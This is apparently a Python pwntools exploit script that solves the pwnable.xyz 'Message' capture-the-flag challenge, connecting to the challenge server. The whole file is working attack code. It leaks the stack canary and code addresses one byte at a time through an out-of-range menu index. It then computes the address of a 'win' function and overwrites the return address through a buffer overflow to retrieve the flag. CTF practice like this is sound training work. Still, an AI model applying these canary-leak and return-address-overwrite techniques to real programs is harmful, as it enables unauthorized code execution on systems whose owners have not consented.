from pwn import *

# Pwnable.xyz Message challenge
# 100 points

"""
Message taker.
Message: TTT
Menu:
1. Edit message.
2. Print message.
3. Admin?
> 2
"""

context(arch="amd64", kernel="amd64")

def menu(p, variant):
	p.recvuntil(b"> ")
	p.sendline(str(variant).encode("utf-8"))

def get_message(p):
	menu(p, 2)
	p.recvuntil(b": ")
	inp_message = p.recvuntil(b"\nMenu")
	return inp_message[:-5]


def set_message(p, new_message):
	menu(p, 1)
	p.recvuntil(b": ")
	p.sendline(new_message)


def leak_canary(p):
	possible_canary = b"\x00"
	for i in range(7):
		cur_chr = 0x30+0xa+1+i
		menu(p, pack(cur_chr, 8).decode("utf-8"))
		# Now check for the return answer
		answ = p.recv(4)
		print("[+] Received %d answer: %s" % (i, answ))
		if answ == b"Erro":
			p.recvuntil(b": ")
			code = int(p.recvuntil(b" ")[:-1])
			possible_canary += pack(code, 8)
		elif answ == b"Mess":
			# Selected entry "Edit message" (*cur_chr == 1)
			possible_canary += pack(1, 8)
			p.recvuntil(b": ")
			p.sendline(b"A"*39)
		elif answ == b"Your":
			# Selected entry "Your message"
			possible_canary += pack(2, 8)
			p.recvuntil(b"Menu")
		elif answ == b"Menu":
			# Probably, selected entry "Admin?"
			possible_canary += pack(3, 8)
		else:
			print("Canary error!!!")

	print("[+] Canary: ", possible_canary)
	print("[+] Hex canary: 0x%X" % unpack(possible_canary))
	return possible_canary

def leak_address(p, is_rbp):
	possible_addr = b""
	cur_chr = 0x30+0xa+8
	if not is_rbp:
		cur_chr += 8

	for i in range(8):
		if i >= 6:
			# First significant byte is always zero
			possible_addr += b"\x00"
			continue
		menu(p, pack(cur_chr, 8).decode("utf-8"))
		cur_chr += 1
		# Now check for the return answer
		answ = p.recv(4)
		print("[+] Received %d answer: %s" % (i, answ))
		if answ == b"Erro":
			p.recvuntil(b": ")
			code = int(p.recvuntil(b" ")[:-1])
			possible_addr += pack(code, 8)
		elif answ == b"Mess":
			# Selected entry "Edit message" (*cur_chr == 1)
			possible_addr += pack(1, 8)
			p.recvuntil(b": ")
			p.sendline(b"A"*39)
		elif answ == b"Your":
			# Selected entry "Your message"
			possible_addr += pack(2, 8)
			p.recvuntil(b"Menu")
		elif answ == b"Menu":
			# Probably, selected entry "Admin?"
			possible_addr += pack(3, 8)
		else:
			print("Address error!!!")

	print("[+] Address: ", hex(unpack(possible_addr)))
	return possible_addr

def main():
	e = ELF("challenge")
	if 0:
		p = process("./challenge")
		# gdb.attach(p)
	elif 0:
		p = process(["strace", "-o", "strace.out", "./challenge"])
	else:
		p = remote("svc.pwnable.xyz", 30017)

	
	p.recvuntil(b": ")
	p.sendline(b"A"*39)

	# menu(p, -1)
	# menu(p, 2)

	# for i in range(8):
	# 	cur_mess = get_message(p)
	# 	if (len(cur_mess) == 40+i+1):
	# 		possible_canary += pack(cur_mess[-1], 8)
	# 	else:
	# 		possible_canary += b"\x00"
	# 	print("Receive message: ", cur_mess)
	# 	set_message(p, b"A"*(40+i+1))

	# print(possible_canary)
	# set_message(p, b"A"*40+possible_canary+b"A"*16)
	# menu(p, 0)
	# menu(p, 2)


	# Try to read canaries with get_choice
	possible_canary = leak_canary(p)
	# It located in 0000000000000B30, win at 0000000000000AAC
	possible_addr = leak_address(p, False)
	win_addr = unpack(possible_addr) - 0xB30 + 0xAAC
	possible_rbp = leak_address(p, True)
	print("[+] Message: ", b"A"*40 + possible_canary + pack(win_addr) + possible_rbp)
	set_message(p, b"A"*40 + possible_canary + possible_rbp + pack(win_addr) + possible_rbp)
	# p.interactive()
	menu(p, 0)
	print(p.recvuntil(b"}"))
	print(p.recvline())
	print(p.recvline())
	print(p.recvline())
	# res = int(p.recvline().split(b" ")[2])
	# print("Bad character: ", pack(res, 8))
	# print(p.recvline())
	# print(p.recvline())
	menu(p, 2)


main()